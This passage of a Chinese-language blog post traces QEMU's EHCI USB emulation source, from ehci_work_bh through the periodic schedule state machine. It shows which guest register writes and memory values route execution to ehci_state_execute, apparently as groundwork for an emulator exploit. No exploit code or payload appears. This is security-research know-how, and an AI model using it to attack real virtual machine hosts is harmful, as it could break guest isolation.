<p>我们接下来依次分析一下函数触发的条件首先是<code>ehci_work_bh</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_work_bh</span><span class="params">(<span class="type">void</span> *opaque)</span></span><br><span class="line">&#123;</span><br><span class="line">  EHCIState *ehci = opaque;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ehci-&gt;working) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ehci-&gt;working = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  t_now = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">  ns_elapsed = t_now - ehci-&gt;last_run_ns;</span><br><span class="line">  uframes = ns_elapsed / UFRAME_TIMER_NS;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE) &#123;</span><br><span class="line">    need_timer++;</span><br><span class="line">    <span class="keyword">if</span> (uframes &gt; (ehci-&gt;maxframes * <span class="number">8</span>)) &#123;</span><br><span class="line">      skipped_uframes = uframes - (ehci-&gt;maxframes * <span class="number">8</span>);</span><br><span class="line">      ehci_update_frindex(ehci, skipped_uframes);</span><br><span class="line">      ehci-&gt;last_run_ns += UFRAME_TIMER_NS * skipped_uframes;</span><br><span class="line">      uframes -= skipped_uframes;</span><br><span class="line">      DPRINTF(<span class="string">&quot;WARNING - EHCI skipped %d uframes\n&quot;</span>, skipped_uframes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; uframes; i++) &#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">      ehci_update_frindex(ehci, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ((ehci-&gt;frindex &amp; <span class="number">7</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        ehci_advance_periodic_state(ehci); <span class="comment">// 目标函数</span></span><br><span class="line">      &#125;</span><br><span class="line">      ehci-&gt;last_run_ns += UFRAME_TIMER_NS;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> ehci_update_frindex(EHCIState *ehci, <span class="type">int</span> uframes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  ehci-&gt;frindex = (ehci-&gt;frindex + uframes) % <span class="number">0x4000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USBCMD_PSE       (1 &lt;&lt; 4)      <span class="comment">// Periodic Schedule Enable</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">ehci_periodic_enabled</span><span class="params">(EHCIState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ehci_enabled(s) &amp;&amp; (s-&gt;usbcmd &amp; USBCMD_PSE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USBCMD_RUNSTOP   (1 &lt;&lt; 0)      <span class="comment">// run / Stop</span></span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">ehci_enabled</span><span class="params">(EHCIState *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> s-&gt;usbcmd &amp; USBCMD_RUNSTOP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从上述代码中我们可以看到，首先需要满足条件判断<code>ehci_periodic_enabled(ehci) || ehci-&gt;pstate != EST_INACTIVE</code>，这里我们选择满足前者，也就是<code>ehci_periodic_enabled(ehci)</code>，那么就需要<code>s-&gt;usbcmd &amp; USBCMD_RUNSTOP==1 &amp;&amp; s-&gt;usbcmd &amp; USBCMD_PSE==1</code>这两个条件。</p>
<blockquote>
<p>这里对<code>usbcmd</code>的设置可以通过<code>mmio_write(0x20, value)</code>进行设置，因为<code>usbcmd</code>是<code>opreg</code>结构体中的成员变量，而0x20用来设置该结构体中的值，<code>usbcmd</code>是第一个成员变量，因此这里直接<code>mmio_write(0x20, value)</code>即可以设置<code>usbcmd</code>。</p>
</blockquote>
<p>接着需要满足<code>(ehci-&gt;frindex &amp; 7) == 0</code>判断条件，在这个判断条件之前，函数会调用<code>ehci_update_frindex(ehci, 1);</code>，该函数会导致<code>frindex</code>每次<code>+1</code>，也就是总会满足这个判断条件。</p>
<p>接着进入<code>ehci_advance_periodic_state</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_advance_periodic_state</span><span class="params">(EHCIState *ehci)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">int</span> async = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span>(ehci_get_state(ehci, async)) &#123;</span><br><span class="line">    <span class="keyword">case</span> EST_INACTIVE:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> EST_ACTIVE:</span><br><span class="line">        <span class="keyword">if</span> (!(ehci-&gt;frindex &amp; <span class="number">7</span>) &amp;&amp; !ehci_periodic_enabled(ehci)) &#123;<span class="comment">// 进入函数的先决条件，肯定满足</span></span><br><span class="line">          <span class="comment">//...</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">list</span> = ehci-&gt;periodiclistbase &amp; <span class="number">0xfffff000</span>;</span><br><span class="line">        <span class="comment">/* check that register has been set */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">list</span> |= ((ehci-&gt;frindex &amp; <span class="number">0x1ff8</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (get_dwords(ehci, <span class="built_in">list</span>, &amp;entry, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DPRINTF(<span class="string">&quot;PERIODIC state adv fr=%d.  [%08X] -&gt; %08X\n&quot;</span>,</span><br><span class="line">                ehci-&gt;frindex / <span class="number">8</span>, <span class="built_in">list</span>, entry);</span><br><span class="line">        ehci_set_fetch_addr(ehci, async,entry);</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHENTRY);</span><br><span class="line">        ehci_advance_state(ehci, async);  <span class="comment">// 目标函数</span></span><br><span class="line">        ehci_queues_rip_unused(ehci, async);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_get_state</span><span class="params">(EHCIState *s, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> async ? s-&gt;astate : s-&gt;pstate;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_dwords</span><span class="params">(EHCIState *ehci, <span class="type">uint32_t</span> addr,</span></span><br><span class="line"><span class="params">                             <span class="type">uint32_t</span> *buf, <span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ehci-&gt;as) &#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++, buf++, addr += <span class="keyword">sizeof</span>(*buf)) &#123;</span><br><span class="line">        dma_memory_read(ehci-&gt;as, addr, buf, <span class="keyword">sizeof</span>(*buf));</span><br><span class="line">        *buf = le32_to_cpu(*buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_set_fetch_addr</span><span class="params">(EHCIState *s, <span class="type">int</span> async, <span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (async) &#123;</span><br><span class="line">        s-&gt;a_fetch_addr = addr;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        s-&gt;p_fetch_addr = addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码中我们看到，首先需要满足<code>ehci-&gt;pstate==EST_ACTIVE</code>，才能够进入<code>case</code>，接着进行了一个<code>if</code>判断，但是这个判断的条件正好是我们由<code>ehci_work_bh</code>进入<code>ehci_advance_periodic_state</code>函数的先觉条件，因此这里总是可以满足，也就不会绕过<code>break</code>。</p>
<p>接着将<code>ehci-&gt;periodiclistbase</code>对齐后的地址赋值给了<code>list</code>，然后执行了<code>list |= ((ehci-&gt;frindex &amp; 0x1ff8) &gt;&gt; 1);</code>从调试来看这里等价于<code>list+4</code>，这里只要满足<code>list!=0</code>即可。接下来是<code>get_words</code>的条件判断，这里需要满足<code>ehci-&gt;as != 0</code>。接着是调用了两个<code>set</code>函数，比较重要的就是<code>ehci_set_fetch_addr</code>函数，首先是<code>get_words</code>从<code>list</code>中读取内容赋值给<code>entry</code>，接着<code>ehci_set_fetch_addr</code>函数将<code>entry</code>赋值给<code>echi-&gt;p_fetch_addr</code>。</p>
<p>接着看一下<code>ehci_advance_state</code>函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is the state machine that is common to both async and periodic</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ehci_advance_state</span><span class="params">(EHCIState *ehci, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    EHCIQueue *q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> itd_count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> again;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span>(ehci_get_state(ehci, async)) &#123;</span><br><span class="line">        <span class="keyword">case</span> EST_WAITLISTHEAD:</span><br><span class="line">            again = ehci_state_waitlisthead(ehci, async);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHENTRY:</span><br><span class="line">            again = ehci_state_fetchentry(ehci, async);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHQH:</span><br><span class="line">            q = ehci_state_fetchqh(ehci, async);</span><br><span class="line">            <span class="keyword">if</span> (q != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                assert(q-&gt;async == async);</span><br><span class="line">                again = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                again = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHITD:</span><br><span class="line">            again = ehci_state_fetchitd(ehci, async);</span><br><span class="line">            itd_count++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHSITD:</span><br><span class="line">            again = ehci_state_fetchsitd(ehci, async);</span><br><span class="line">            itd_count++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_ADVANCEQUEUE:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_advqueue(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_FETCHQTD:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_fetchqtd(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_HORIZONTALQH:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_horizqh(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_EXECUTE:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_execute(q); <span class="comment">// 目标函数</span></span><br><span class="line">            <span class="keyword">if</span> (async) &#123;</span><br><span class="line">                ehci-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_EXECUTING:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (async) &#123;</span><br><span class="line">                ehci-&gt;async_stepdown = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            again = ehci_state_executing(q);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> EST_WRITEBACK:</span><br><span class="line">            assert(q != <span class="literal">NULL</span>);</span><br><span class="line">            again = ehci_state_writeback(q);</span><br><span class="line">            <span class="keyword">if</span> (!async) &#123;</span><br><span class="line">                ehci-&gt;periodic_sched_active = PERIODIC_ACTIVE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Bad state!\n&quot;</span>);</span><br><span class="line">            again = <span class="number">-1</span>;</span><br><span class="line">            g_assert_not_reached();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (again);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_get_state</span><span class="params">(EHCIState *s, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> async ? s-&gt;astate : s-&gt;pstate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看注释该函数是一个状态机，根据<code>echi-&gt;pstate</code>的值来决定进入哪个状态。经过调试函数会首先进入<code>EST_FETCHENTRY</code>状态调用<code>ehci_state_fetchentry</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ehci_state_fetchentry</span><span class="params">(EHCIState *ehci, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> again = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (NLPTR_TYPE_GET(entry)) &#123;</span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_QH:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHQH);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_ITD:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHITD);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> NLPTR_TYPE_STITD:</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHSITD);</span><br><span class="line">        again = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> again;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NLPTR_TYPE_GET(x)        (((x) &gt;&gt; 1) &amp; 3)</span></span><br></pre></td></tr></table></figure>

<p>该函数又是通过<code>NLPTR_TYPE_GET</code>函数的返回值来进一步的设置状态。<code>NLPTR_TYPE_GET</code>是一个宏定义，也就是函数通过<code>entry/2</code>的单子节来确定状态。</p>
<p>我们需要将状态机的状态转到<code>EST_EXECUTE</code>，我们搜索一下看一下哪里能够设置该状态。首先需要设置<code>EST_FETCHQH</code>状态，处理该状态过程中会调用<code>ehci_state_fetchqh</code>函数，并将状态转换到<code>EST_FETCHQTD</code>，处理<code>EST_FETCHQTD</code>状态的时候会调用<code>ehci_state_fetchqtd</code>函数，该函数就会将状态转换到<code>EST_EXECUTE</code>进而调用<code>ehci_state_execute</code>函数。</p>
<p>而<code>EST_FETCHQH</code>状态的进入可以通过<code>ehci_state_fetchentry</code>函数来实现，要进入<code>EST_FETCHQH</code>状态需要使得<code>NLPTR_TYPE_GET(entry) </code>的低一字节为<code>1</code>，也就是设置<code>entry</code>的低一字节为<code>2</code>，那么<code>(2 &gt;&gt; 1) &amp; 3</code>计算结果即为<code>1</code>，即可进入到<code>EST_FETCHQH</code>状态，那么下面我们来看一下该状态处理中会调用的<code>ehci_state_fetchqh</code>函数。我们调用该函数的主要目的是为了使得状态机转换到<code>EST_FETCHQTD</code>状态。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> EHCIQueue *<span class="title function_">ehci_state_fetchqh</span><span class="params">(EHCIState *ehci, <span class="type">int</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> entry;</span><br><span class="line">    EHCIQueue *q;</span><br><span class="line">    EHCIqh qh;</span><br><span class="line"></span><br><span class="line">    entry = ehci_get_fetch_addr(ehci, async);</span><br><span class="line">    q = ehci_find_queue_by_qh(ehci, entry, async);</span><br><span class="line">    <span class="keyword">if</span> (q == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q = ehci_alloc_queue(ehci, entry, async);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    q-&gt;seen++;</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;seen &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* we are going in circles -- stop processing */</span></span><br><span class="line">        ehci_set_state(ehci, async, EST_ACTIVE);</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (get_dwords(ehci, NLPTR_GET(q-&gt;qhaddr),</span><br><span class="line">                   (<span class="type">uint32_t</span> *) &amp;qh, <span class="keyword">sizeof</span>(EHCIqh) &gt;&gt; <span class="number">2</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    ehci_trace_qh(q, NLPTR_GET(q-&gt;qhaddr), &amp;qh);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The overlay area of the qh should never be changed by the guest,</span></span><br><span class="line"><span class="comment">     * except when idle, in which case the reset is a nop.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!ehci_verify_qh(q, &amp;qh)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ehci_reset_queue(q) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            ehci_trace_guest_bug(ehci, <span class="string">&quot;guest updated active QH&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    q-&gt;qh = qh;</span><br><span class="line"></span><br><span class="line">    q-&gt;transact_ctr = get_field(q-&gt;qh.epcap, QH_EPCAP_MULT);</span><br><span class="line">    <span class="keyword">if</span> (q-&gt;transact_ctr == <span class="number">0</span>) &#123; <span class="comment">/* Guest bug in some versions of windows */</span></span><br><span class="line">        q-&gt;transact_ctr = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        q-&gt;dev = ehci_find_device(q-&gt;ehci,</span><br><span class="line">                                  get_field(q-&gt;qh.epchar, QH_EPCHAR_DEVADDR));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (q-&gt;qh.token &amp; QTD_TOKEN_HALT) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">     <span class="comment">// #define QTD_TOKEN_ACTIVE              (1 &lt;&lt; 7)</span></span><br><span class="line">      <span class="comment">// #define NLPTR_TBIT(x)            ((x) &amp; 1)  // 1=invalid, 0=valid</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((q-&gt;qh.token &amp; QTD_TOKEN_ACTIVE) &amp;&amp;</span><br><span class="line">               (NLPTR_TBIT(q-&gt;qh.current_qtd) == <span class="number">0</span>) &amp;&amp;</span><br><span class="line">               (q-&gt;qh.current_qtd != <span class="number">0</span>)) &#123;</span><br><span class="line">        q-&gt;qtdaddr = q-&gt;qh.current_qtd;</span><br><span class="line">        ehci_set_state(ehci, async, EST_FETCHQTD); <span class="comment">// 目标位置</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

